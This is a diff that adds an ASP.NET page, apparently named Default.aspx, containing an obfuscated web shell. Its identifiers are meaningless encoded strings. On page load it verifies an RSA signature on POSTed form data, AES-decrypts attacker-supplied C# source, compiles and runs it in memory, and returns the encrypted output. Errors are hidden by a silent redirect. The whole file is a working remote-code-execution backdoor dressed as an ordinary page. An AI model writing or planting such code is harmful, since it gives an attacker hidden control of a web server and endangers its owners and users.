@@ -1,0 +1,80 @@
+<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" %>
+<%@ Import Namespace="System.Reflection"%>
+<%@ Import Namespace="Microsoft.CSharp"%>
+<%@ Import Namespace="System.CodeDom.Compiler"%>
+<%@ Import Namespace="System.IO"%>
+<%@ Import Namespace="System.Security.Cryptography"%>
+<script language="c#" runat="server">
+    public byte[] YjA0YjI3MTY2NDI5(String NGFkNGIyZjczODY0, byte[] MjFlYzBkNzc0Y2Rl)
+    {
+        byte[] MTI5NDk5ODc2NTdi = Convert.FromBase64String(NGFkNGIyZjczODY0);
+        using (MemoryStream Mjk5MzdlYTU1ZTdj = new MemoryStream())
+        {
+            RijndaelManaged NWQ0MDk3NTI5MTgw = new RijndaelManaged();
+            NWQ0MDk3NTI5MTgw.Mode = CipherMode.CBC;
+            using (CryptoStream MDdiMzM2NmQxOTI2 = new CryptoStream(Mjk5MzdlYTU1ZTdj, NWQ0MDk3NTI5MTgw.CreateDecryptor(MjFlYzBkNzc0Y2Rl, MjFlYzBkNzc0Y2Rl), CryptoStreamMode.Write))
+            {
+                MDdiMzM2NmQxOTI2.Write(MTI5NDk5ODc2NTdi, 0, MTI5NDk5ODc2NTdi.Length);
+                MDdiMzM2NmQxOTI2.FlushFinalBlock();
+            }
+            return Mjk5MzdlYTU1ZTdj.ToArray();
+        }
+    }
+
+	public void Page_Load(object sender, EventArgs e)
+	{
+		try
+        {
+            RSACryptoServiceProvider MmJlM2ZjYmFjMGUy = new RSACryptoServiceProvider();
+				
+			RSAParameters ZmNhMGU0ZmY2YjBi = new RSAParameters();
+			ZmNhMGU0ZmY2YjBi.Modulus = Convert.FromBase64String("zGvQkloajzVDboz4ANrINAWQQWcCfHzx5qAz2bgpBL9wV6vZwqeP0Z9c70/ycmfap0AUJ9F/7poZtSx6AdQAOfb2Hokdm7uV6oaeNlC0WlEv5n3b2fFx9rb37lfyIi/EJ/sqDAD1JvEvSOCAv6fl/GyCUMDJCjCL3NYwfFQBBUc=");
+			ZmNhMGU0ZmY2YjBi.Exponent = new byte[] { 1, 0, 1 };
+			
+			MmJlM2ZjYmFjMGUy.ImportParameters(ZmNhMGU0ZmY2YjBi);
+			byte[] MTI5NDk5ODc2NTdi = null;
+			byte[] MjFlYzBkNzc0Y2Rl = null;
+			String Njc2NjNkNTk4NDYy = "";
+			
+			Guid ODlhMTZlYmM3NTky = Guid.NewGuid();
+			MjFlYzBkNzc0Y2Rl = ODlhMTZlYmM3NTky.ToByteArray();
+			string ZjA2Y2NjMDQ5Nzc5 = Request.Form.GetValues(0)[0], MDY5MmM1NTRmNDhh = Request.Form.GetValues(1)[0], M2FmMDE1NDE5Zjhi = Request.Form.GetValues(2)[0], M2M1OGJmMmFkYjU2 = Request.Form.GetValues(3)[0];
+			
+			if (MmJlM2ZjYmFjMGUy.VerifyData(Encoding.UTF8.GetBytes(ZjA2Y2NjMDQ5Nzc5), new SHA1CryptoServiceProvider(), Convert.FromBase64String(MDY5MmM1NTRmNDhh)))
+			{
+				byte[] Mzg3ZDZhNGY4Yjlj = Convert.FromBase64String(M2M1OGJmMmFkYjU2);
+				byte[] MzU1MTQ5MDNiYjg1 = YjA0YjI3MTY2NDI5(ZjA2Y2NjMDQ5Nzc5, Mzg3ZDZhNGY4Yjlj);
+				byte[] NDczMDMxZDc2Nzg2 = YjA0YjI3MTY2NDI5(M2FmMDE1NDE5Zjhi, Mzg3ZDZhNGY4Yjlj);
+				CompilerParameters MTJmOTBkMjM5MWVk = new CompilerParameters(new string[] { "System.dll", "System.Data.dll", "System.Xml.dll" });
+				MTJmOTBkMjM5MWVk.GenerateInMemory = true;
+				MTJmOTBkMjM5MWVk.GenerateExecutable = false;
+				object MTY5ZmFlMDE0ZjJl = (new CSharpCodeProvider()).CompileAssemblyFromSource(MTJmOTBkMjM5MWVk, Encoding.UTF8.GetString(MzU1MTQ5MDNiYjg1)).CompiledAssembly.CreateInstance("A.B");
+				MethodInfo YTRlZDIyNzU5ZGZi = MTY5ZmFlMDE0ZjJl.GetType().GetMethod("C");
+				MTI5NDk5ODc2NTdi = (byte[])YTRlZDIyNzU5ZGZi.Invoke(MTY5ZmFlMDE0ZjJl, Encoding.UTF8.GetString(NDczMDMxZDc2Nzg2).Split('|'));
+				using (MemoryStream Mjk5MzdlYTU1ZTdj = new MemoryStream())
+				{
+					RijndaelManaged NWQ0MDk3NTI5MTgw = new RijndaelManaged();
+					NWQ0MDk3NTI5MTgw.Mode = CipherMode.CBC;
+					using (CryptoStream MDdiMzM2NmQxOTI2 = new CryptoStream(Mjk5MzdlYTU1ZTdj, NWQ0MDk3NTI5MTgw.CreateEncryptor(MjFlYzBkNzc0Y2Rl, MjFlYzBkNzc0Y2Rl), CryptoStreamMode.Write))
+					{
+						MDdiMzM2NmQxOTI2.Write(MTI5NDk5ODc2NTdi, 0, MTI5NDk5ODc2NTdi.Length);
+						MDdiMzM2NmQxOTI2.FlushFinalBlock();
+					}
+					Njc2NjNkNTk4NDYy = Convert.ToBase64String(Mjk5MzdlYTU1ZTdj.ToArray());
+				}
+
+				Response.Write(Convert.ToBase64String(MmJlM2ZjYmFjMGUy.Encrypt(MjFlYzBkNzc0Y2Rl, true)) + "\r\n" + Njc2NjNkNTk4NDYy + "\r\n");
+			}
+			else
+			{
+
+			}
+			return;
+		}
+		catch (Exception )
+		{
+			Response.Redirect("/");
+			return;
+		}
+	}
+</script>
